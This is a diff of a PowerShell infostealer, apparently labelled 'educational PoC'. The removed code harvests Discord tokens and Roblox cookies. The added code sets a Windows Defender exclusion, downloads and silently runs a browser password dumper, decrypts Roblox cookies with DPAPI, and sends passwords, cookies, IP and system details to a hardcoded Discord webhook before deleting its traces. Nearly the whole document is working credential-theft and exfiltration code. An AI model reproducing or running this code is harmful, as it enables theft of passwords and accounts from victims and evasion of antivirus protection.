@@ -1,264 +1,72 @@
-
-<#
- EDUCATIONAL PROOF OF CONCEPT - TEST IN VM ONLY
- Extracts Discord tokens and Roblox cookies, sends to Discord webhook
-#>
-
-# === CONFIGURATION ===
-$webhookUrl = "https://discord.com/api/webhooks/1450141358412136519/MvQdD57MwTlZXdA2YFJ03pyREwf6JptKCdgqRh-34moUdSsFJvhmVzlzkFzh2xYR4lJo"  # Change this
+$webhookUrl = "https://discord.com/api/webhooks/1450141358412136519/MvQdD57MwTlZXdA2YFJ03pyREwf6JptKCdgqRh-34moUdSsFJvhmVzlzkFzh2xYR4lJo"
 $computerName = $env:COMPUTERNAME
 $userName = $env:USERNAME
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
-# === DISCORD TOKEN EXTRACTION ===
-function Get-DiscordTokens {
-    Write-Host "[*] Extracting Discord tokens..." -ForegroundColor Cyan
-    
-    $tokens = @()
-    $discordPaths = @(
-        "$env:APPDATA\discord\Local Storage\leveldb",
-        "$env:APPDATA\discordptb\Local Storage\leveldb",
-        "$env:APPDATA\discordcanary\Local Storage\leveldb",
-        "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
-    )
-    
-    foreach ($path in $discordPaths) {
-        if (Test-Path $path) {
-            Write-Host "  [+] Checking: $path" -ForegroundColor Gray
-            
-            try {
-                $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
-                foreach ($file in $files) {
-                    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
-                    if ($content) {
-                        # Match both MFA and standard tokens
-                        $mfaMatches = [regex]::Matches($content, 'mfa\.[A-Za-z0-9_-]{84}')
-                        $standardMatches = [regex]::Matches($content, '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}')
-                        
-                        foreach ($match in $mfaMatches) { $tokens += $match.Value }
-                        foreach ($match in $standardMatches) { $tokens += $match.Value }
-                    }
-                }
-            } catch {
-                Write-Host "  [!] Error reading $path" -ForegroundColor Red
-            }
-        }
-    }
-    
-    return $tokens | Select-Object -Unique
-}
+$safeEnv = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "safe_env"
+New-Item -Path $safeEnv -ItemType Directory -Force | Out-Null
+Add-MpPreference -ExclusionPath $safeEnv
 
-# === ROBLOX COOKIE EXTRACTION ===
-function Get-RobloxCookies {
-    Write-Host "[*] Extracting Roblox cookies..." -ForegroundColor Cyan
-    
-    $cookies = @()
-    
-    # Chrome-based browsers (Edge, Chrome, Brave, Opera)
-    $browserPaths = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
-        "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"
-    )
-    
-    # Firefox paths
-    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" -ErrorAction SilentlyContinue
-    foreach ($profile in $firefoxProfiles) {
-        $browserPaths += "$($profile.FullName)\cookies.sqlite"
-    }
-    
-    # Try each browser path
-    foreach ($path in $browserPaths) {
-        if (Test-Path $path) {
-            Write-Host "  [+] Checking: $path" -ForegroundColor Gray
-            
-            try {
-                # Copy DB to avoid locks
-                $tempDb = "$env:TEMP\cookies_$(Get-Random).db"
-                Copy-Item -Path $path -Destination $tempDb -Force -ErrorAction SilentlyContinue
-                
-                if (Test-Path $tempDb) {
-                    # Load SQLite assembly
-                    if (-not [System.Reflection.Assembly]::LoadWithPartialName('System.Data.SQLite')) {
-                        Write-Host "  [!] SQLite assembly not found - skipping" -ForegroundColor Yellow
-                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-                        continue
-                    }
-                    
-                    $conn = New-Object System.Data.SQLite.SQLiteConnection
-                    $conn.ConnectionString = "Data Source=$tempDb"
-                    
-                    try {
-                        $conn.Open()
-                        
-                        # Different query based on browser type
-                        if ($path -like "*.sqlite") {
-                            $query = "SELECT name, value FROM moz_cookies WHERE name = '.ROBLOSECURITY'"
-                        } else {
-                            $query = "SELECT name, encrypted_value FROM cookies WHERE name = '.ROBLOSECURITY'"
-                        }
-                        
-                        $cmd = $conn.CreateCommand()
-                        $cmd.CommandText = $query
-                        $reader = $cmd.ExecuteReader()
-                        
-                        while ($reader.Read()) {
-                            if ($path -like "*Chrome*" -or $path -like "*Edge*" -or $path -like "*Brave*") {
-                                # Chrome cookies are encrypted with DPAPI
-                                Write-Host "  [!] Encrypted Roblox cookie found - requires DPAPI" -ForegroundColor Yellow
-                                $cookies += "[Encrypted Roblox cookie found]"
-                            } else {
-                                # Firefox cookies are plaintext
-                                $cookieValue = $reader["value"]
-                                if ($cookieValue -like "*_.ROBLOSECURITY*") {
-                                    $cookies += $cookieValue
-                                }
-                            }
-                        }
-                        
-                        $reader.Close()
-                    } catch {
-                        Write-Host "  [!] SQL error: $_" -ForegroundColor Red
-                    } finally {
-                        $conn.Close()
-                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            } catch {
-                Write-Host "  [!] Error reading $path" -ForegroundColor Red
-            }
-        }
-    }
-    
-    return $cookies | Select-Object -Unique
-}
+Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccommandline.zip" -OutFile "$env:USERPROFILE\Documents\safe_env\passreccommandline.zip" -Headers @{Authorization=("Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("download:nirsoft123!"))); "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"} -UseBasicParsing
 
-# === TOKEN VALIDATION ===
-function Test-DiscordToken {
-    param($token)
-    
+Start-Sleep -Seconds 8
+
+& "$env:ProgramFiles\WinRAR\WinRAR.exe" e "$env:USERPROFILE\Documents\safe_env\passreccommandline.zip" "WebBrowserPassView.exe" "$env:USERPROFILE\Documents\safe_env\" -pnirsoft123! -y
+
+Start-Sleep -Seconds 5
+
+Start-Process -FilePath "$env:USERPROFILE\Documents\safe_env\WebBrowserPassView.exe" -Verb RunAs -ArgumentList "/stext", "`"$env:USERPROFILE\Documents\safe_env\passwords.txt`"" -Wait -WindowStyle Hidden
+
+Start-Sleep -Seconds 5
+
+$robloxCookies = ""
+$robloxDataPath = "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+if (Test-Path $robloxDataPath) {
     try {
-        $headers = @{
-            "Authorization" = $token
-            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        
-        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -ErrorAction Stop
-        return @{
-            valid = $true
-            username = "$($response.username)#$($response.discriminator)"
-            id = $response.id
-            email = $response.email
-        }
-    } catch {
-        return @{ valid = $false }
-    }
+        $jsonContent = Get-Content $robloxDataPath -Raw
+        $cookiesData = ($jsonContent | ConvertFrom-Json).CookiesData
+        $bytes = [System.Convert]::FromBase64String($cookiesData)
+        $robloxCookies = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+    } catch {}
 }
 
-# === DISCORD WEBHOOK SEND ===
-function Send-ToDiscord {
-    param(
-        $tokens,
-        $robloxCookies,
-        $tokenInfo
-    )
-    
-    # Format token list
-    $tokenText = ""
-    if ($tokens.Count -gt 0) {
-        $tokenText = $tokens -join "`n"
-    } else {
-        $tokenText = "No tokens found"
-    }
-    
-    # Format Roblox cookies
-    $robloxText = ""
-    if ($robloxCookies.Count -gt 0) {
-        $robloxText = $robloxCookies -join "`n"
-    } else {
-        $robloxText = "No Roblox cookies found"
-    }
-    
-    # Get system info
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
-    $os = (Get-WmiObject Win32_OperatingSystem).Caption
-    
-    # Build Discord embed (no emojis)
-    $fields = @(
-        @{
-            name = "System"
-            value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip"
-            inline = $true
-        },
-        @{
-            name = "Discord Tokens"
-            value = "```$tokenText```"
-            inline = $false
-        },
-        @{
-            name = "Roblox Cookies"
-            value = "```$robloxText```"
-            inline = $false
-        }
-    )
-    
-    # Add token info if available
-    if ($tokenInfo.valid) {
-        $fields += @{
-            name = "Valid Token"
-            value = "User: $($tokenInfo.username)`nID: $($tokenInfo.id)`nEmail: $($tokenInfo.email)"
-            inline = $false
-        }
-    }
-    
-    $embed = @{
-        title = "Grabber Results"
-        color = 0x5865F2
-        fields = $fields
-        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
-        footer = @{
-            text = "Educational PoC - VM Only"
-        }
-    }
-    
-    $payload = @{
-        embeds = @($embed)
-    } | ConvertTo-Json -Depth 10
-    
-    # Send to webhook
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
-        Write-Host "[+] Results sent to Discord" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Failed to send: $_" -ForegroundColor Red
-    }
+$passwords = ""
+$passwordFile = "$env:USERPROFILE\Documents\safe_env\passwords.txt"
+if (Test-Path $passwordFile) {
+    $passwords = Get-Content $passwordFile -Raw
 }
 
-# === MAIN EXECUTION ===
-Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "EDUCATIONAL GRABBER - TEST IN VM ONLY" -ForegroundColor Yellow
-Write-Host "========================================" -ForegroundColor Magenta
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
+$os = (Get-WmiObject Win32_OperatingSystem).Caption
 
-# Extract tokens
-$tokens = Get-DiscordTokens
-Write-Host "[+] Found $($tokens.Count) Discord tokens" -ForegroundColor Green
+$fields = @(
+    @{
+        name = "System"
+        value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip`nTime: $timestamp"
+        inline = $true
+    },
+    @{
+        name = "Passwords"
+        value = if ($passwords) { "```$passwords```" } else { "```No passwords found```" }
+        inline = $false
+    },
+    @{
+        name = "Roblox Cookies"
+        value = if ($robloxCookies) { "```$robloxCookies```" } else { "```No Roblox cookies found```" }
+        inline = $false
+    }
+)
 
-# Extract Roblox cookies
-$robloxCookies = Get-RobloxCookies
-Write-Host "[+] Found $($robloxCookies.Count) Roblox cookies" -ForegroundColor Green
-
-# Validate first token (optional)
-$tokenInfo = @{ valid = $false }
-if ($tokens.Count -gt 0) {
-    Write-Host "[*] Validating first token..." -ForegroundColor Cyan
-    $tokenInfo = Test-DiscordToken -token $tokens[0]
+$embed = @{
+    title = "Grabber Results"
+    color = 0x5865F2
+    fields = $fields
+    timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
+    footer = @{ text = "VM Testing Only" }
 }
 
-# Send to Discord webhook
-if ($webhookUrl -ne "YOUR_DISCORD_WEBHOOK_URL") {
-    Send-ToDiscord -tokens $tokens -robloxCookies $robloxCookies -tokenInfo $tokenInfo
-}
+$payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
 
-Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "[✓] Complete - Results logged above" -ForegroundColor Green
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+
+Remove-Item -Path $safeEnv -Recurse -Force -ErrorAction SilentlyContinue
